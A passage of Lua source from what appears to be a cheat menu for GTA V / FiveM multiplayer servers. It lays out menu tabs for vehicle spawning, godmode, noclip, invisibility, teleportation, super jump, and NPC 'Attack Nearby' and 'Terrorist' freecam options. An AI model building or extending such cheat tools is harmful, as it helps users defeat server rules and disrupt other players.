           end
           if sum.f.IsDisabledControlJustPressed(0, 15) and y ~= (0.387+0.0155*2) and sum.f.mouse((dW/2)+0.561+drag_X+dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['vehicle'].static2 = sum.st['vehicle'].static2 + add
           end
   
           sum.f.separator('Vehicle Spawner', 0.51, 0.387+0.0155) 
   
          
               if sum.f.combo('Vehicle Spawner', {"Addon", "Super", "Sports", "Sports Classic", "Services", "Suvs", "Sedans", "Planes", "Offroads", "Muscles", "Motorcycles", "Military", "Industrial", "Helicopters", "Emergency", "Bikes", "Coupes", "Compacts", "Commercials", "Boats", "Trailer", "Trains", "Ulity", "Vans"} , 0.51, 0.387, sum.combo[6], function(currentIndex)
                   sum.combo[6] = currentIndex
               end) then
               end
   
           if sum.combo[6] == 1 then 
               for k, v in sum.curak.pairs(sum.vehaddonslist) do
                   if sum.f.IsModelValid(sum.f.GetHashKey(v.spawn)) then
                       if y >= 0.4153 and y <= max2 then 
                           if sum.f.button(v.name, 0.51, y) then
                               sum.f.spawnvehicle(v.spawn)
                           end 
                       end y = y + 0.015
                   end 
               end 
           elseif sum.combo[6] == 2 then 
               for k, v in pairs(sum.fuckingsuper) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 3 then 
               for k, v in pairs(sum.fuckingsports) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 4 then 
               for k, v in pairs(sum.fuckingsporclas) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 5 then 
               for k, v in pairs(sum.fuckingservice) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 6 then 
               for k, v in pairs(sum.fuckingsuvs) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 7 then 
               for k, v in pairs(sum.fuckingsedans) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 8 then 
               for k, v in pairs(sum.fuckingplane) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 9 then 
               for k, v in pairs(sum.fuckingoffro) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 10 then 
               for k, v in pairs(sum.fuckingmuscle) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 11 then 
               for k, v in pairs(sum.fuckingmoto) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 12 then 
               for k, v in pairs(sum.fuckingmili) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 13 then 
               for k, v in pairs(sum.fuckingindu) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 14 then 
               for k, v in pairs(sum.fuckingheli) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 15 then 
               for k, v in pairs(sum.fuckinemergency) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 16 then 
               for k, v in pairs(sum.fuckingbikes) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 17 then 
               for k, v in pairs(sum.fuckingcoupes) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 18 then 
               for k, v in pairs(sum.fuckingcompacts) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 19 then 
               for k, v in pairs(sum.fuckingcommercial) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 20 then 
               for k, v in pairs(sum.fuckingboat) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 21 then 
               for k, v in pairs(sum.fuckingtrailer) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 22 then 
               for k, v in pairs(sum.fuckingtrains) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 23 then 
               for k, v in pairs(sum.fuckingworking) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           elseif sum.combo[6] == 24 then 
               for k, v in pairs(sum.fuckingvans) do 
                   if y >= 0.4153 and y <= max2 then 
                       if sum.f.button(v, 0.51, y) then 
                           sum.f.spawnvehicle(v)
                       end
                   end y = y + add  
               end
           end
   
       
   
   
           local y = 0.387+sum.st['vehicle'].static
           
           if sum.f.IsDisabledControlPressed(0, 14) and y > (0.387 - (14 * add)) and sum.f.mouse((dW/2)+0.439+drag_X-dW/4, 0.51+drag_Y+dH/2, dW+0.12-dW/2, 0.264+dH) then
               sum.st['vehicle'].static = sum.st['vehicle'].static - add
           end
           if sum.f.IsDisabledControlJustPressed(0, 15) and y ~= 0.387 and sum.f.mouse((dW/2)+0.439+drag_X-dW/4, 0.51+drag_Y+dH/2, dW+0.12-dW/2, 0.264+dH) then
               sum.st['vehicle'].static = sum.st['vehicle'].static + add
           end
   
           if y >= 0.385 and y <= max then 
               sum.f.separator('Cheats', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('vehicle-bunnyhop', 'Vehicle Jump', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('vehicle-autorepair', 'Auto Repair', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('vehicle-hornboost', 'Horn Boost', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('vehicle-rainbowveh', 'Rainbow Mode', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('vehicle-driftmode', 'Drift Mode', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('vehicle-bulletproof', 'Bullet Proof Tires', 0.3875, y) 
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('vehicle-waterproof', 'Water Proof Engine', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('vehicle-invisible', 'Invisible', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               if sum.f.button('Extra Handling Attachment', 0.3875, y) then 
                   local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                   sum.f.SetVehicleGravityAmount(veh, sum.s['extra-handling-attachment'].value)
               end
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['extra-handling-attachment'], 0.3875, y, 1) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               if sum.f.button('Engine Boost', 0.3875, y) then
                   local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false) 
                   sum.f.ModifyVehicleTopSpeed(veh, sum.s['engine-boost'].value + 1.0)
               end
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['engine-boost'], 0.3875, y, 1) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.separator('Spawning Options', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('vehicle-maxout', 'Max Out', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('vehicle-enterveh', 'Enter To Vehicle', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('vehicle-changecolor', 'Change Color', 0.3875, y) 
               if sum.f.pickerbutton(sum.s['vehicle-color-r'].value, sum.s['vehicle-color-g'].value, sum.s['vehicle-color-b'].value, 0.3875, y) then 
                   sum.s['vehicle-color-r'].value, sum.s['vehicle-color-g'].value, sum.s['vehicle-color-b'].value = sum.f.ColorPicker(sum.s['vehicle-color-r'].value, sum.s['vehicle-color-g'].value, sum.s['vehicle-color-b'].value)
               end 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               if sum.f.button('Spawn Vehicle', 0.3875, y) then 
                   local v = sum.f.kinput('Vehicle', 'adder', 100)
                   if v then 
                       sum.f.spawnvehicle(v)
                   end
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.separator('NPC Options', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Control Actions', {"Drive To Waypoint", "Cars To Nearby", "No-Gravity", "Attack Nearby"} , 0.3875, y, sum.combo[12], function(currentIndex)
                   sum.combo[12] = currentIndex
               end) then
                   if sum.combo[12] == 1 then 
                       sum.f.CarsToWaypoint()
                   elseif sum.combo[12] == 2 then 
                       sum.f.CarsToMe()
                   elseif sum.combo[12] == 3 then 
                       sum.f.CarsNoGravity()
                   elseif sum.combo[12] == 4 then 
                       sum.f.CarsToWaypointATTACK()
                   end
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.separator('Modification Options', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Tunning', {"Max", "Performance"} , 0.3875, y, sum.combo[8], function(currentIndex)
                   sum.combo[8] = currentIndex
               end) then
                   if sum.combo[8] == 1 then 
                   local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                       sum.f.maxout(veh)
                   elseif sum.combo[8] == 2 then 
                   local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                       sum.f.maxperformance(veh)
                   end
               end
           end y = y + add
           if y >= 0.385 and y <= max then 
               if sum.f.button('Neons Color', 0.3875, y) then
                   if sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), 0) then
                       local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                       sum.f.SetNeonsOnVeh()
                       sum.f.SetVehicleNeonLightsColour(veh, sum.s['neon-color-r'].value, sum.s['neon-color-g'].value, sum.s['neon-color-b'].value)
                   end
               end
               if sum.f.pickerbutton(sum.s['neon-color-r'].value, sum.s['neon-color-g'].value, sum.s['neon-color-b'].value, 0.3875, y) then 
                   sum.s['neon-color-r'].value, sum.s['neon-color-g'].value, sum.s['neon-color-b'].value = sum.f.ColorPicker(sum.s['neon-color-r'].value, sum.s['neon-color-g'].value, sum.s['neon-color-b'].value)
               end 
           end y = y + add 
   
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Xenon Color', {"Default", "White", "Blue", "Electric Blue", "Mint Green", "Lime Green", "Yellow", "Golder Shower", "Orange", "Red", "Pony Pink", "Hot Pink", "Purple", "Blacklight"} , 0.3875, y, sum.combo[20], function(currentIndex)
                   sum.combo[20] = currentIndex
               end) then
                   if sum.combo[20] == 1 then 
                       if sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), 0) then
                           local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, -1)
                       end
                   elseif sum.combo[20] == 2 then 
                       if sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), 0) then
                           local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 0)
                       end
                   elseif sum.combo[20] == 3 then 
                       if sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), 0) then
                           local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 1)
                       end
                   elseif sum.combo[20] == 4 then 
                       if sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), 0) then
                           local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 2)
                       end
                   elseif sum.combo[20] == 5 then 
                       if sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), 0) then
                           local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 3)
                       end
                   elseif sum.combo[20] == 6 then 
                       if sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), 0) then
                           local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 4)
                       end
                   elseif sum.combo[20] == 7 then 
                       if sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), 0) then
                           local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 5)
                       end
                   elseif sum.combo[20] == 8 then 
                       if sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), 0) then
                           local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 6)
                       end
                   elseif sum.combo[20] == 9 then 
                       if sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), 0) then
                           local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 7)
                       end
                   elseif sum.combo[20] == 10 then 
                       if sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), 0) then
                           local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 8)
                       end
                   elseif sum.combo[20] == 11 then 
                       if sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), 0) then
                           local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 9)
                       end
                   elseif sum.combo[20] == 12 then 
                       if sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), 0) then
                           local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 10)
                       end
                   elseif sum.combo[20] == 13 then 
                       if sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), 0) then
                           local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 11)
                       end
                   elseif sum.combo[20] == 14 then 
                       if sum.f.IsPedInAnyVehicle(sum.f.PlayerPedId(), 0) then
                           local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 12)
                       end
                   end
               end
           end y = y + add
   
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Hygiene', {"Clean", "Dirt"} , 0.3875, y, sum.combo[9], function(currentIndex)
                   sum.combo[9] = currentIndex
               end) then
                   if sum.combo[9] == 1 then 
                       local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                       sum.f.SetVehicleDirtLevel(veh, 1.0)
                   elseif sum.combo[9] == 2 then 
                       local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                       sum.f.SetVehicleDirtLevel(veh, 15.0)
                   end
               end
           end y = y + add
           if y >= 0.385 and y <= max then 
               if sum.f.button('Change Color', 0.3875, y) then
                   local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                   sum.f.SetVehicleCustomPrimaryColour(veh, sum.s['vehicle-color-r'].value, sum.s['vehicle-color-g'].value, sum.s['vehicle-color-b'].value)
                   sum.f.SetVehicleCustomSecondaryColour(veh, sum.s['vehicle-color-r'].value, sum.s['vehicle-color-g'].value, sum.s['vehicle-color-b'].value)
               end
               if sum.f.pickerbutton(sum.s['vehicle-color-r'].value, sum.s['vehicle-color-g'].value, sum.s['vehicle-color-b'].value, 0.3875, y) then 
                   sum.s['vehicle-color-r'].value, sum.s['vehicle-color-g'].value, sum.s['vehicle-color-b'].value = sum.f.ColorPicker(sum.s['vehicle-color-r'].value, sum.s['vehicle-color-g'].value, sum.s['vehicle-color-b'].value)
               end 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Police Vehicle', 0.3875, y) then
                   sum.f.vehiclepolice()
               end
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.separator('General Options', 0.3875, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Action', {"Repair", "Flip", "Repair Engine"} , 0.3875, y, sum.combo[10], function(currentIndex)
                   sum.combo[10] = currentIndex
               end) then
               if sum.combo[10] == 1 then 
                   local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                       sum.f.SetVehicleFixed(veh)
                   elseif sum.combo[10] == 2 then 
                       local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                       sum.f.SetVehicleOnGroundProperly(veh)
                   elseif sum.combo[10] == 3 then 
                       local veh = sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false)
                       sum.f.SetVehicleEngineHealth(veh)
                   end
               end
           end y = y + add
           if y >= 0.385 and y <= max then 
               if sum.f.button('Delete Vehicle', 0.3875, y) then
                   sum.f.SetEntityAsMissionEntity(sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false), 1, 1)
                   sum.f.DeleteEntity(sum.f.GetVehiclePedIsIn(sum.f.PlayerPedId(), false))
               end
           end y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Custom Plate', 0.3875, y) then
                   local p = sum.f.PlayerPedId()
                   local veh = sum.f.GetVehiclePedIsIn(p, false)
                   local platetext = sum.f.kinput('Enter text', '', 8)
                   sum.f.SetVehicleNumberPlateText(veh, platetext)
               end
           end y = y + add 
           
   
   
       end
   
       if sum.f.tab == 'player' then 
           local y = 0.387+sum.st['player'].static
           local add = 0.0155
           local max = 0.65+dH/1.06
           if sum.f.IsDisabledControlPressed(0, 14) and y > (0.387 - (46 * add)) and sum.f.mouse((dW/2)+0.439+drag_X-dW/4, 0.51+drag_Y+dH/2, dW+0.12-dW/2, 0.264+dH) then
               sum.st['player'].static = sum.st['player'].static - add
           end
           if sum.f.IsDisabledControlJustPressed(0, 15) and y ~= 0.387 and sum.f.mouse((dW/2)+0.439+drag_X-dW/4, 0.51+drag_Y+dH/2, dW+0.12-dW/2, 0.264+dH) then
               sum.st['player'].static = sum.st['player'].static + add
           end
   
           if y >= 0.385 and y <= max then 
               sum.f.separator('Noclip', 0.3875, y) 
           end
           y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-noclip', 'Noclip', 0.3875, y) 
           end
           y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-noclip-invis', 'Noclip Invisible', 0.3875, y) 
           end
           y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['player-noclip-value'], 0.3875, y, 1) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.separator('Invincible', 0.3875, y) 
           end
           y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-godmode', 'Godmode', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-nodamage', 'No Damage', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-anticritialhits', 'Anti Critical Hits', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.separator('Ragdoll Options', 0.3875, y)
           end
           y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-ragdoll', 'Ragdoll', 0.3875, y)
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-noragdoll', 'Disable Ragdoll', 0.3875, y)
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.separator('Super Powers', 0.3875, y)
           end
           y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-invisible', 'Invisible', 0.3875, y)
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-nocollision', 'No Collision', 0.3875, y)
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-ignore-collision', 'Ignore Player Collision', 0.3875, y)
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-superreun', 'Super Run', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['player-superrun'], 0.3875, y, 1) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-superrun-slide', 'Super Slide Run', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['player-superrun-slide'], 0.3875, y, 1) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-superjump', 'Super Jump', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['player-superjump'], 0.3875, y, 1) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-pokemongo', 'Pokemon Go', 0.3875, y) 
           end
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-stopdrowing', 'Stop Drowing In Water', 0.3875, y) 
           end
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-superMan', 'Super Man', 0.3875, y) 
           end
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-walkOnWater', 'Walk On Water', 0.3875, y) 
           end
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.separator('FOV Changer', 0.3875, y) 
           end
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('self-gameplay-fov', 'FOV Changer', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('fov-crosshair', 'Crosshair', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.button('Gameplay FOV', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['self-gameplay-fov'], 0.3875, y, 1) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.separator('Teleportation', 0.3875, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('focusveh', 'Teleport To Focused Vehicle', 0.3875, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('waypoint3d', 'Waypoint 3D', 0.3875, y) 
               if sum.f.pickerbutton(sum.s['waypoint-r'].value, sum.s['waypoint-g'].value, sum.s['waypoint-b'].value, 0.3875, y) then 
                   sum.s['waypoint-r'].value, sum.s['waypoint-g'].value, sum.s['waypoint-b'].value = sum.f.ColorPicker(sum.s['waypoint-r'].value, sum.s['waypoint-g'].value, sum.s['waypoint-b'].value)
               end
           end y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Teleport To Waypoint', 0.3875, y) then
                   sum.f.SetEntityToWaypoint()
               end
           end y = y + add
           if y >= 0.385 and y <= max then 
               if sum.f.button('Coords To Waypoint', 0.3875, y) then
                   local x = sum.f.kinput("Enter ~b~X~s~ Value", "", 10)
                   local y = sum.f.kinput("Enter ~b~Y~s~ Value", "", 10)
                   if x and y then 
                       sum.f.SetNewWaypoint(tonumber(x)+0.0, tonumber(y)+0.0)
                       sum.f.sendNotification('Waypoint set to ~b~X~s~: '..x..' ~b~Y~s~: '..y,'Teleportations')
                   end
               end
           end y = y + add
           if y >= 0.385 and y <= max then 
               if sum.f.button('Teleport To Nearest Car', 0.3875, y) then
                   sum.f.SetEntityToNearestVehicle()
               end
           end y = y + add
           if y >= 0.385 and y <= max then 
               if sum.f.button('Teleport To Coords', 0.3875, y) then
                   sum.f.SetEntityToChoosenCoords()
               end
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.separator('Freecam', 0.3875, y) 
           end
           y = y + add 
       
   
           if sum.combo[21] == 1 then 
               sum.freecamparticles = {'core', 'ent_sht_petrol_fire'}
           elseif sum.combo[21] == 2 then 
               sum.freecamparticles = {'scr_rcbarry2', 'scr_clown_bul'}
           elseif sum.combo[21] == 3 then 
               sum.freecamparticles = {'core', 'exp_grd_petrol_pump'}
           elseif sum.combo[21] == 4 then 
               sum.freecamparticles = {'scr_rcbarry2', 'scr_clown_appears'}
           end
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-freecam', 'Freecam', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Particle: ', {"Fire", "Flower", "Explosion", "Clown"} , 0.3875, y, sum.combo[21], function(currentIndex)
                   sum.combo[21] = currentIndex
                   if sum.combo[21] == 1 then 
                       sum.freecamparticles = {'core', 'ent_sht_petrol_fire'}
                   elseif sum.combo[21] == 2 then 
                       sum.freecamparticles = {'scr_rcbarry2', 'scr_clown_bul'}
                   elseif sum.combo[21] == 3 then 
                       sum.freecamparticles = {'core', 'exp_grd_petrol_pump'}
                   elseif sum.combo[21] == 4 then 
                       sum.freecamparticles = {'scr_rcbarry2', 'scr_clown_appears'}
                   end
               end) then
                   
               end
           end  y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['freecam-particle-scale'], 0.3875, y, 1) 
            end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.button('Freecam FOV', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['player-freecam-fov'], 0.3875, y, 1) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.button('Freecam Speed', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['player-freecam-speed'], 0.3875, y, 1) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.button('Freecam Sens', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['player-freecam-sensitivity'], 0.3875, y, 1) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.button('Freecam Terrorist Delay', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['player-freecam-terrorist'], 0.3875, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.separator('Movement', 0.3875, y) 
           end
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-infinitecombatroll', 'Infinite Combat Roll', 0.3875, y) 
           end
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-infinitejumps', 'Infinite Jumps', 0.3875, y) 
           end
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('player-stamina', 'Unlimited Stamina', 0.3875, y) 
           end 
           y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.separator('General', 0.3875, y) 
           end
           y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Revive', 0.3875, y) then 
                   sum.f.StopScreenEffect("DeathFailOut")
